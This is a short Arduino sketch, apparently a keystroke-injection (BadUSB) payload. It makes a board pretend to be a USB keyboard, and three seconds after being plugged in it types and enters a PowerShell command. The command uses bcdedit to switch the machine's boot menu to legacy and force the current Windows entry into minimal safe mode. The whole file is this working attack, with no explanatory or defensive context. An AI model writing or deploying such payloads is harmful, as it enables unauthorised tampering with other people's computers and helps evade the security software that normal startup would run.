#include <USBHIDKeyboard.h>
USBHIDKeyboard Keyboard;

void setup() {
  Keyboard.begin();
  delay(3000);
  Keyboard.println(F("powershell -c \"bcdedit /set {current} bootmenupolicy legacy & bcdedit /set {current} safeboot minimal\""));
}
